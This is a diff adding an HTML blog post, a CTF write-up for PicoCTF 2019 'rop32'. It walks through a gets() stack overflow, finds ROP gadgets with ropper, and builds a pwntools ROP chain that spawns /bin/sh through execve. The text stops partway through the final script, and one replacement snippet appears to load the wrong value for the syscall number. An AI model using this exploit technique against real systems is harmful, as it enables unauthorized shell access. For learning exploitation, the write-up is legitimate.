@@ -1,0 +1,563 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <meta name="generator" content="Hugo 0.80.0" />
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://shiny-labs.re/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://shiny-labs.re/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://shiny-labs.re/favicon-16x16.png">
+    <link rel="manifest" href="https://shiny-labs.re/site.webmanifest">
+    <link rel="mask-icon" href="https://shiny-labs.re/safari-pinned-tab.svg" color="#000000">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="theme-color" content="#ffffff">
+
+
+    <link rel="stylesheet" href="https://shiny-labs.re/css/bulma.min.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/main.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/syntax.css">
+
+    
+    <title>shiny-labs || PicoCTF 2019 - rop32</title>
+</head>
+<body><nav class="navbar" role="navigation" aria-label="main navigation">
+    <div class="navbar-brand">
+        <a class="navbar-item no-squiggly" href="https://shiny-labs.re/">
+            <h1 id="logo" class="glitch">shiny-labs</h1>
+        </a>
+    </div>
+
+    <div class="navbar-menu">
+        <div class="navbar-start">
+            
+        </div>
+
+        <div class="navbar-end">
+            
+            <h3 id="subtitle">Exploit, reverse engineering and cats.</h3>
+        </div>
+    </div>
+</nav>
+
+<div id="content">
+
+            <div class="columns is-centered">
+                <div class="column is-three-fifths" id="menu-column"><div id="menu" class="tabs is-centered is-medium">
+    <ul>
+            <li><a href="https://shiny-labs.re/" class="no-squiggly">Home</a></li>
+            <li><a href="https://shiny-labs.re/archives/" class="no-squiggly">Archives</a></li>
+            <li><a href="https://shiny-labs.re/tags/" class="no-squiggly">Tags</a></li>
+            <li><a href="https://shiny-labs.re/about/" class="no-squiggly">About</a></li>
+  </ul>
+</div>
+
+<div class="columns">
+<div class="column is-10" id="main-column">
+    <article class="article">
+        <div >
+            <h1 class="article-title">PicoCTF 2019 - rop32</h1>
+            
+<div class="post-meta">
+  <p class="article-meta">
+  <span>Date</span> &#x5b;
+  <time datetime="June 17, 2020">
+      Jun 17
+    </time>
+  &#x5d;
+        
+        
+  <span>Categories</span> &#x5b;
+    <a href="https://shiny-labs.re/categories/ctf">CTF</a>
+  &#x5d;
+        
+        
+  <span>Series</span> &#x5b;
+    <a href="https://shiny-labs.re/series"></a>
+  &#x5d;
+        
+        
+  <span>Tags</span> &#x5b;
+    <a href="https://shiny-labs.re/tags/rop">rop</a>
+  &#x5d;
+  </p>
+</div>
+
+        </div>
+        <div>
+            <h1 id="description">Description</h1>
+<blockquote>
+<p>Can you exploit the following program to get a flag? You can find the program in /problems/rop32_0_b4142d4df31cb73e170c77dac234a79a on the shell server. Source.</p>
+</blockquote>
+<p>Hint: This is a classic ROP to get a shell</p>
+<h1 id="solution">Solution</h1>
+<p>Let&rsquo;s start with the source code:</p>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="cp">#define BUFSIZE 16
+</span><span class="cp"></span>
+<span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Can you ROP your way out of this?</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+
+  <span class="c1">// Set the gid to the effective gid
+</span><span class="c1"></span>  <span class="c1">// this prevents /bin/sh from dropping the privileges
+</span><span class="c1"></span>  <span class="n">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
+  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
+  <span class="n">vuln</span><span class="p">();</span>
+
+<span class="p">}</span>
+</code></pre></div><p>The vulnerability here is due to the usage of the <code>gets()</code> function. The manual is pretty clear about its usage:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">DESCRIPTION
+       Never use this function.
+
+       gets()  reads  a  line from stdin into the buffer pointed to by s until either a terminating newline or EOF,
+       which it replaces with a null byte (&#39;\0&#39;).  No check for buffer overrun is performed (see BUGS below).
+</code></pre></div><p>Let&rsquo;s switch to the binary now!</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ file vuln  
+vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=e721465344e7c57465e7bd57ccc1b22d853dc760, not stripped
+</code></pre></div><p>And try to crash it:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ python -c &#34;print(&#39;A&#39;*200)&#34; | ./vuln
+Can you ROP your way out of this?
+[1]    661175 done                              python -c &#34;print(&#39;A&#39;*200)&#34; | 
+       661176 segmentation fault (core dumped)  ./vuln
+</code></pre></div><p>But this time, the stack is non-executable:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ checksec vuln
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre></div><p>To bypass this, we can use ROP.  I usually use ropper <a href="https://scoding.de/ropper/">https://scoding.de/ropper/</a> to find my ROP gadgets&hellip; You can install it with:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ pip install --user ropper
+</code></pre></div><p>The easiest usage is [ /!\ it generates lots of output ]</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ ropper --file vuln
+...
+20218 gadgets found
+</code></pre></div><p>Usually, you want to append the <code>--search</code> option with whatever you are looking for. For example, let&rsquo;s say we are looking for an <code>int 0x80</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ ropper --file vuln --search &#34;int 0x80&#34;
+[INFO] Load gadgets from cache
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] Searching for gadgets: int 0x80
+
+[INFO] File: vuln
+0x08049563: int 0x80; 
+0x0806f7a0: int 0x80; ret;
+</code></pre></div><p>Soooo, our goal is to spawn a shell, ie, somehow invoke this C code:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">execve(&#34;/bin/sh&#34;, NULL, NULL)
+</code></pre></div><p>To do it in assembly, we need to set the registers:</p>
+<ul>
+<li>EAX = syscall number of SYS_execve = 0xB</li>
+<li>EBX = 1rst argument, &ldquo;/bin/sh&rdquo;</li>
+<li>ECX = 2nd arg, 0</li>
+<li>EDX = 3rd arg, also 0</li>
+</ul>
+<p>And then call the instruction <code>int 0x80</code></p>
+<p>Let&rsquo;s go gadget hunting!</p>
+<h2 id="finding-gadgets">Finding Gadgets</h2>
+<h3 id="set-eax--0xb">Set EAX = 0xB</h3>
+<ul>
+<li>we can just push 0xB on the stack</li>
+<li>and use a <code>pop eax</code> to move it to eax</li>
+</ul>
+<p>Best gadget:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">0x080a8e36: pop eax; ret;
+</code></pre></div><h3 id="set-ebx--pointer-on-binsh">Set EBX = pointer on &ldquo;/bin/sh&rdquo;</h3>
+<p>Next, we need to put a pointer to &ldquo;/bin/sh&rdquo; in EBX. You can probably guess that we will not find &ldquo;/bin/sh&rdquo; lying around in the binary. We need to craft it and put it there! That&rsquo;s exactly the purpose of a type of primitive called write-what-where:</p>
+<p>Basically, we need a primitive called <em>write-what-where</em>, for example, with these 3 gadgets:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">0x080a8e36: pop eax; ret;
+0x0806ee6b: pop edx; ret; 
+0x0809d034: mov dword ptr [eax], edx; ret; 
+</code></pre></div><ul>
+<li>eax is the destination, here the &ldquo;where&rdquo;</li>
+<li>edx is the source, here the &ldquo;what&rdquo;</li>
+<li>we can fill eax and edx by putting stuff on the stack and then calling the <code>pop</code> so that it ends up in the register</li>
+<li>then we move the content of edx to the address pointed by eax ==&gt; we can write what we want where we want</li>
+</ul>
+<p>And we also need gadgets to set edx to 0 so that we can write a null byte at the end of &ldquo;/bin/sh&rdquo;</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">0x080564d5: mov edx, 0xffffffff; ret;
+0x0805e095: inc edx; ret;
+</code></pre></div><p>We also need to decide where we are going to write &ldquo;/bin/sh&rdquo;, looking at the sections of the binary, <code>.data</code> is usually a good option.</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"> readelf -S vuln | grep &#34; .data &#34;
+  [20] .data             PROGBITS        080da060 091060 000f20 00  WA  0   0 32
+</code></pre></div><p>Here the .data section has the W flag for writable and is located at address 080da060</p>
+<p>And then, we need a gadget to put that address into EBX:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">0x080481c9: pop ebx; ret;33
+</code></pre></div><h3 id="set-ecx--0">Set ECX = 0</h3>
+<p>There was no simple <code>pop ecx</code> in the binary, so I opted for the next best option:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">0x0806ee92: pop ecx; pop ebx; ret; 
+</code></pre></div><p>Which is perfectly fine since we need to set EBX anyway&hellip;</p>
+<h3 id="set-edx--0">Set EDX = 0</h3>
+<p>We already have that gadget from the EBX part:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">0x0806ee6b: pop edx; ret;
+</code></pre></div><h3 id="call-int-0x80">Call int 0x80</h3>
+<p>And finally, to invoke a syscall:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">0x08049563: int 0x80; 
+</code></pre></div><h2 id="assembling-everything">Assembling Everything</h2>
+<p>Now that we have all of our gadgets, we need to find out where to put the first gadget and chain all the gadgets.</p>
+<h3 id="finding-the-offset-of-the-first-gadget">Finding the Offset of the First Gadget</h3>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ gdb vuln
+gef➤  pattern create 100
+[+] Generating a pattern of 100 bytes
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+[+] Saved as &#39;$_gef0&#39;
+gef➤  r
+Starting program: vuln 
+Can you ROP your way out of this one?
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+
+Program received signal SIGSEGV, Segmentation fault.
+0x61616168 in ?? ()
+[ Legend: Modified register | Code | Heap | Stack | String ]
+─────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$eax   : 0xffffc620  →  &#34;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]&#34;
+$ebx   : 0x61616166 (&#34;faaa&#34;?)
+$ecx   : 0x080da340  →  0xfbad2288
+$edx   : 0x080db87c  →  0x00000000
+$esp   : 0xffffc640  →  &#34;iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]&#34;
+$ebp   : 0x61616167 (&#34;gaaa&#34;?)
+$esi   : 0x080da000  →  0x00000000
+$edi   : 0x080481a8  →  &lt;_init+0&gt; push ebx
+$eip   : 0x61616168 (&#34;haaa&#34;?)
+$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
+─────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0xffffc640│+0x0000: &#34;iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]&#34;	 ← $esp
+0xffffc644│+0x0004: &#34;jaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaava[...]&#34;
+0xffffc648│+0x0008: &#34;kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]&#34;
+0xffffc64c│+0x000c: &#34;laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxa[...]&#34;
+0xffffc650│+0x0010: &#34;maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]&#34;
+0xffffc654│+0x0014: &#34;naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#34;
+0xffffc658│+0x0018: &#34;oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#34;
+0xffffc65c│+0x001c: &#34;paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#34;
+───────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
+[!] Cannot disassemble from $PC
+[!] Cannot access memory at address 0x61616168
+───────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: &#34;vuln&#34;, stopped 0x61616168 in ?? (), reason: SIGSEGV
+─────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+gef➤  pattern search haaa
+[+] Searching &#39;haaa&#39;
+[+] Found at offset 25 (little-endian search) likely
+[+] Found at offset 28 (big-endian search) 
+</code></pre></div><p>So, a string with 28 bytes of padding followed by an address should let us control EIP:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"> gef➤  r &lt;&lt;&lt; $(python2 -c &#34;print(&#39;O&#39;*28+&#39;ABCD&#39;)&#34;)
+ [...]
+ [#0] Id 1, Name: &#34;vuln&#34;, stopped 0x44434241 in ?? (), reason: SIGSEGV
+</code></pre></div><p>Okay, we control EIP now! And we know that our first gadget should be at offset 28.</p>
+<h3 id="chaining-gadgets">Chaining Gadgets</h3>
+<p>Now that we have all our gadgets, we can code a <code>build_payload()</code> function:</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">POP_EDX</span>          <span class="o">=</span> <span class="mh">0x0806ee6b</span>
+<span class="n">POP_EAX</span>          <span class="o">=</span> <span class="mh">0x080a8e36</span>
+<span class="n">MOV_DWORD_EDX_TO_EAX</span>   <span class="o">=</span> <span class="mh">0x0809d034</span> <span class="c1"># mov dword ptr [eax], edx; ret;</span>
+<span class="n">INC_EAX</span>          <span class="o">=</span> <span class="mh">0x0807c2fa</span>
+<span class="n">XOR_EAX</span>          <span class="o">=</span> <span class="mh">0x08056420</span>
+<span class="n">INT_80</span> <span class="o">=</span> <span class="mh">0x0806f7a0</span> <span class="c1"># int 0x80, ret;</span>
+
+<span class="n">DATA_ADDR</span>        <span class="o">=</span> <span class="mh">0x080da060</span>
+
+
+<span class="k">def</span> <span class="nf">build_payload</span><span class="p">():</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;Z&#34;</span> <span class="o">*</span> <span class="mi">28</span> <span class="c1"># padding until we overflow</span>
+
+    <span class="c1">##### step 1: stash the string /bin//sh in the .data section</span>
+
+    <span class="c1">## write &#34;/bin&#34;</span>
+    <span class="c1"># put the address of the .data section in eax</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">POP_EAX</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">DATA_ADDR</span><span class="p">)</span>
+    <span class="c1"># put /bin in edx</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">POP_EDX</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;/bin&#34;</span>
+    <span class="c1"># write the content of edx to the address pointed by eax</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">MOV_DWORD_EDX_TO_EAX</span><span class="p">)</span>
+
+    <span class="c1">## write &#34;//sh&#34;</span>
+    <span class="c1"># put the address of the .data section + 4 (so after /bin) in eax</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">POP_EAX</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">DATA_ADDR</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span>
+    <span class="c1"># put //sh in edx</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">POP_EDX</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;//sh&#34;</span>
+    <span class="c1"># write the content of edx to the address pointed by eax</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">MOV_DWORD_EDX_TO_EAX</span><span class="p">)</span>
+
+    <span class="c1">## write null byte at the end of /bin//sh</span>
+    <span class="c1"># put the address of the .data section + 8 (so after /bin//sh) in eax</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">POP_EAX</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">DATA_ADDR</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span>
+    <span class="c1"># set edx to 0</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x080564d5</span><span class="p">)</span> <span class="c1"># mov edx, 0xffffffff; ret;</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x0805e095</span><span class="p">)</span> <span class="c1"># inc edx; ret;</span>
+    <span class="c1"># write the content of edx to the address pointed by eax</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">MOV_DWORD_EDX_TO_EAX</span><span class="p">)</span>
+
+
+    <span class="c1">#####  step 2: fill the arguments for sys_execve</span>
+    <span class="c1"># put 11 in eax</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">POP_EAX</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0xb</span><span class="p">)</span>
+    <span class="c1"># put the address of .data in ebx, where /bin//sh is</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x0806ee92</span><span class="p">)</span> <span class="c1"># pop ecx; pop ebx; ret;</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x00000000</span><span class="p">)</span> <span class="c1"># put 0 in ecx</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">DATA_ADDR</span><span class="p">)</span> <span class="c1"># put .data in ebx</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">POP_EDX</span><span class="p">)</span> <span class="c1"># put 0 in edx</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x00000000</span><span class="p">)</span>
+
+    <span class="c1">#####  step 3: make a syscall</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">INT_80</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">payload</span>
+</code></pre></div><p>And call it with:</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="n">build_payload</span><span class="p">()</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;vuln&#34;</span><span class="p">)</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="s2">&#34;c&#34;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div><p>The whole script can be run with:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ ./solve.py
+</code></pre></div><p>The script automatically start and attach gdb for faster debugging, but if you want to skip debugging, just add:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ ./solve.py NOPTRACE=1
+</code></pre></div><p>Now, everyone gets a ROP chain correctly on the first try right?</p>
+<h2 id="debugging-the-rop-chain">Debugging the ROP chain</h2>
+<p>Well&hellip; I don&rsquo;t know about everyone, but mine didn&rsquo;t work&hellip; I had this output in gdb:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">[#0] Id 1, Name: &#34;vuln&#34;, stopped 0x8008e36 in ?? (), reason: SIGSEGV
+</code></pre></div><p>And you might be thinking that this address look familiar right? Let me help:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">POP_EAX          = 0x080a8e36
+</code></pre></div><p>It looks a lot like the address of the <code>pop eax</code> gadget, except with the 0x0A is missing! What the hell happened here&hellip; Courtesy of the <code>gets()</code> function ~~ Remember that part of the man?</p>
+<blockquote>
+<p>gets()  reads  a  line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte ('\0')</p>
+</blockquote>
+<p>It took me a while to join these two pieces of information, that my newline, ie 0x0A, was replaced by a null byte&hellip;</p>
+<h3 id="the-quest-for-a-new-pop-eax">The Quest For A New <code>pop eax</code></h3>
+<p>First idea was just to see if I could find another <code>pop eax</code> that didn&rsquo;t have a 0x0A in its address!</p>
+<p>spoiler: it wasn&rsquo;t successful&hellip;</p>
+<p>Let&rsquo;s see what alternative we can find, excluding the 0x0a from the results this time with the <code>--badbytes</code> option:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ ropper --file vuln --search &#34;pop eax&#34; --badbytes &#34;0a&#34; --inst-count 2
+0x0807416e: pop eax; call edi; 
+0x0809e6c2: pop eax; jmp dword ptr [eax]; 
+0x0805c524: pop eax; ret 0xfffe; 
+</code></pre></div><p>None of them will do&hellip; I tried the last one but it was no gooed, because I need to pop eax several time and the <code>ret 0xfffe</code> severely messes up the stack&hellip;</p>
+<p>Alright, we need an alternative solution, maybe just another gadget? Then I had an idea, if I can find a <code>mov</code> to the <code>eax</code> register, maybe I can just use <code>pop</code> in that other register instead</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ ropper --file vuln --search &#34;mov eax, e?x&#34; --badbytes &#34;0a&#34;
+
+0x08064784: mov eax, edx; ret; 
+</code></pre></div><p>I think we found the perfect gadget to match with our edx gadget:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">0x0806ee6b: pop edx; ret;
+</code></pre></div><p>We can now replace in our Python code:</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python">    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">POP_EAX</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0xb</span><span class="p">)</span>
+</code></pre></div><p>by:</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python">    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">POP_EDX</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">DATA_ADDR</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">MOV_EDX_TO_EAX</span><span class="p">)</span>
+</code></pre></div><h3 id="random-trick-to-debug-a-rop-chain">Random Trick to Debug a ROP chain</h3>
+<p>Throwing a <code>payload += pack(0x12121212)</code> in the middle of your ROP chain can quickly help you troubleshoot (less next instruction in gdb), just run the pwntools script and it will stop to where your 0x12121212 is, or before if your ROP chain is broken.</p>
+<p>Example: here you can use this trick to check that &ldquo;/bin&rdquo; was correctly written in <code>.data.</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python">    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">POP_EDX</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">DATA_ADDR</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">MOV_EDX_TO_EAX</span><span class="p">)</span>
+    <span class="c1"># put /bin in edx</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">POP_EDX</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;/bin&#34;</span>
+    <span class="c1"># write the content of edx to the address pointed by eax</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">MOV_DWORD_EDX_TO_EAX</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x12121212</span><span class="p">)</span>
+</code></pre></div><h2 id="what-about-the-flag-though">What About the Flag Though?</h2>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">POP_EDX</span>                <span class="o">=</span> <span class="mh">0x0806ee6b</span>
+<span class="n">MOV_EDX_TO_EAX</span>         <span class="o">=</span> <span class="mh">0x08064784</span> <span class="c1"># mov eax, edx; ret;</span>
+<span class="n">MOV_DWORD_EDX_TO_EAX</span>   <span class="o">=</span> <span class="mh">0x0809d034</span> <span class="c1"># mov dword ptr [eax], edx; ret;</span>
+<span class="n">INT_80</span>                 <span class="o">=</span> <span class="mh">0x0806f7a0</span> <span class="c1"># int 0x80, ret;</span>
+
+<span class="n">DATA_ADDR</span>              <span class="o">=</span> <span class="mh">0x080da060</span>
+
+<span class="k">def</span> <span class="nf">build_payload</span><span class="p">():</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;Z&#34;</span> <span class="o">*</span> <span class="mi">28</span>
+
+    <span class="c1">##### step 1: stash the string /bin//sh in the .data section</span>
+    <span class="c1">## write &#34;/bin&#34;</span>
+    <span class="c1"># put the address of the .data section in eax</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">POP_EDX</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">DATA_ADDR</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">MOV_EDX_TO_EAX</span><span class="p">)</span>
+    <span class="c1"># put /bin in edx</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">POP_EDX</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;/bin&#34;</span>
+    <span class="c1"># write the content of edx to the address pointed by eax</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">MOV_DWORD_EDX_TO_EAX</span><span class="p">)</span>
+
+    <span class="c1">## write &#34;//sh&#34;</span>
+    <span class="c1"># put the address of the .data section + 4 (so after /bin) in eax</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">POP_EDX</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">DATA_ADDR</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span>
